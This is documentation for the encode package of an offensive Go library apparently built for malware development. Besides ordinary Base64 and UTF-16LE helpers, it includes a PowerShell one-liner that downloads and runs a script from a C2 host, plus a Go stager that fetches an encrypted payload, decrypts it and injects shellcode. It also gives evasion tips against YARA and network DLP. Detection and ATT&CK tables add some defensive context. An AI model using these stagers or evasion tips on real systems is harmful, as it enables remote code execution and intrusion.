---
package: github.com/oioio-space/maldev/encode
---

# Encode

[← encode index](README.md) · [docs/index](../../index.md)

## TL;DR

Transport-safe byte transforms: Base64 (RFC 4648 §4 + §5), UTF-16LE,
ROT13, and PowerShell `-EncodedCommand` (`Base64(UTF-16LE(script))`).
Pure functions, no system interaction, cross-platform.

| You want to send bytes through… | Use | Notes |
|---|---|---|
| HTTP body / JSON string / Go source const | [`Base64Encode`](#base64encode) | Standard alphabet (`+/`) |
| URL path / filename / cookie | [`Base64URLEncode`](#base64urlencode) | URL-safe alphabet (`-_`) |
| Windows API expecting `LPWSTR` | [`ToUTF16LE`](#toutf16le) | Pair with `windows.UTF16PtrFromString` for direct ABI use |
| `powershell.exe -EncodedCommand` | [`PowerShell`](#powershell) | Auto-wraps: `Base64(UTF-16LE(script))` |
| Defeat plaintext-string YARA on Win32 names | [`ROT13`](#rot13) | Novelty cover; not real encoding |

What this DOES achieve:

- Survives byte-mangling channels (HTTP, JSON, command line).
- One-call helpers — no manual base64 + UTF-16 chaining.

What this does NOT achieve:

- **Encoding ≠ encryption** — Base64 is reversible without a
  key. Always encrypt first, encode last (see
  [`crypto`](../crypto/payload-encryption.md) recommended
  stack diagram).
- **Doesn't bypass Defender's `-EncodedCommand` heuristic** —
  Defender flags long Base64 strings on PowerShell command
  lines regardless of content. The technique is for transport
  cover, not detection cover.

## Primer

Encoding solves a different problem from encryption. Many channels
cannot transport arbitrary bytes: HTTP headers reject control characters,
URLs reject `+` and `/`, JSON strings reject zero bytes, command lines
on Windows expect UTF-16, and `powershell.exe -EncodedCommand` accepts
only Base64-of-UTF-16LE.

`encode` covers each of those representations with a one-line API. It is
not a security boundary — Base64 is reversible by anyone who reads the
output. The pattern in this codebase is **encrypt with `crypto`, then
encode for the wire**: confidentiality from the cipher, transportability
from the encoding.

The package has no Windows-specific code (despite UTF-16LE being
Windows' native string format) and cross-compiles cleanly to every Go
target.

## How it works

```mermaid
flowchart LR
    subgraph build [Build / Encode]
        PT[plaintext] --> ENC[crypto.EncryptAESGCM]
        ENC --> CT[ciphertext]
        CT --> B64[encode.Base64Encode]
    end

    subgraph wire [Channel]
        B64 --> JSON[JSON / HTTP header / URL / PS arg]
    end

    subgraph runtime [Runtime / Decode]
        JSON --> B64D[encode.Base64Decode]
        B64D --> CT2[ciphertext]
        CT2 --> DEC[crypto.DecryptAESGCM]
        DEC --> RUN[plaintext for inject]
    end
```

`PowerShell(script)` is a convenience wrapper:
`Base64Encode(ToUTF16LE(script))` — exactly what `powershell.exe
-EncodedCommand` parses.

## API → godoc

[`pkg.go.dev/github.com/oioio-space/maldev/encode`](https://pkg.go.dev/github.com/oioio-space/maldev/encode) is the authoritative
reference for every exported symbol. This page teaches the
*concepts*; the godoc is the *specification*.

## Examples

### Simple

```go
encoded := encode.Base64Encode([]byte("hello"))
decoded, _ := encode.Base64Decode(encoded)
```

See `ExampleBase64Encode`, `ExamplePowerShell`, `ExampleToUTF16LE` in
[`encode_example_test.go`](../../../encode/encode_example_test.go).

### Composed (`crypto` + `encode` for HTTP transport)

Encrypt first, then encode for the wire:

```go
import (
    "github.com/oioio-space/maldev/crypto"
    "github.com/oioio-space/maldev/encode"
)

key, _ := crypto.NewAESKey()
ct, _  := crypto.EncryptAESGCM(key, rawShellcode)
wire   := encode.Base64Encode(ct)
// transport `wire` over HTTP / JSON / etc.

// Receiver:
ct2, _ := encode.Base64Decode(wire)
pt, _  := crypto.DecryptAESGCM(key, ct2)
```

### Advanced (PowerShell stager)

Generate a one-liner that downloads and executes a remote script:

```go
script := `IEX (New-Object Net.WebClient).DownloadString('https://c2.example/s')`
arg := encode.PowerShell(script)
// powershell.exe -NoProfile -EncodedCommand <arg>
```

### Complex (encode + crypto + transport)

End-to-end stager that pulls an encrypted payload from C2, decodes,
decrypts, injects:

```go
import (
    "io"
    "net/http"

    "github.com/oioio-space/maldev/crypto"
    "github.com/oioio-space/maldev/encode"
    "github.com/oioio-space/maldev/inject"
)

func stage(c2URL string, key []byte) error {
    resp, err := http.Get(c2URL)
    if err != nil { return err }
    defer resp.Body.Close()

    body, err := io.ReadAll(resp.Body)
    if err != nil { return err }

    ct, err := encode.Base64URLDecode(string(body))
    if err != nil { return err }

    shellcode, err := crypto.DecryptAESGCM(key, ct)
    if err != nil { return err }

    inj, err := inject.NewWindowsInjector(&inject.WindowsConfig{
        Config: inject.Config{Method: inject.MethodCreateThread},
    })
    if err != nil { return err }
    return inj.Inject(shellcode)
}
```

## OPSEC & Detection

| Artefact | Where defenders look |
|---|---|
| Long Base64 string passed to `powershell.exe -EncodedCommand` | Sysmon Event 1 (Process Create) command-line scanning, AMSI |
| Base64 string > 1 KB in HTTP request body | Network DLP, Suricata `entropy` rules |
| UTF-16LE blob in a text-typed channel | Anomaly: text channels normally see UTF-8 |
| `IEX (New-Object Net.WebClient).DownloadString(...)` after Base64 decode | Sysmon Event 4104 (PowerShell ScriptBlockLogging) |

**D3FEND counters:**

- [D3-SEA](https://d3fend.mitre.org/technique/d3f:StaticExecutableAnalysis/)
  — static executable / script analysis.
- [D3-FCR](https://d3fend.mitre.org/technique/d3f:FileContentRules/) —
  YARA / regex on decoded content.
- [D3-NTPM](https://d3fend.mitre.org/technique/d3f:NetworkTrafficPolicyMapping/)
  — block outbound `IEX`+Base64 patterns at the proxy.

**Hardening:** chunk long Base64 across multiple requests; randomise
field order; pad with realistic noise tokens before encoding.

## MITRE ATT&CK

| T-ID | Name | Sub-coverage | D3FEND counter |
|---|---|---|---|
| [T1027](https://attack.mitre.org/techniques/T1027/) | Obfuscated Files or Information | PowerShell `-EncodedCommand` wrapper, Base64 wrappers | D3-SEA |
| [T1027.013](https://attack.mitre.org/techniques/T1027/013/) | Encrypted/Encoded File | Base64 envelope around encrypted payload | D3-FCR |
| [T1140](https://attack.mitre.org/techniques/T1140/) | Deobfuscate/Decode Files or Information | `Base64Decode`, `Base64URLDecode` | D3-FCR |

## Limitations

- **Encoding is not encryption.** Base64 is trivially reversible.
  Always encrypt before encoding for non-public payloads.
- **Entropy spike on the wire.** Long Base64 strings are visible to
  network DLP. Chunk into multiple requests, or use a more selective
  steganographic carrier.
- **Command-line length cap.** `powershell.exe -EncodedCommand` accepts
  ~32 KB of Base64. Larger stagers must download then execute, not
  embed inline.
- **UTF-16LE assumes BMP.** Supplementary-plane code points (emoji,
  CJK extensions) get surrogate pairs — fine for PowerShell but
  surprises any consumer expecting fixed two-byte units.

## See also

- [`crypto`](../crypto/README.md) — pair to encrypt before encoding.
- [`hash`](../hash/README.md) — fingerprinting and ROR13 API hashing.
- [Microsoft Docs: PowerShell `-EncodedCommand`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_powershell_exe?view=powershell-5.1)
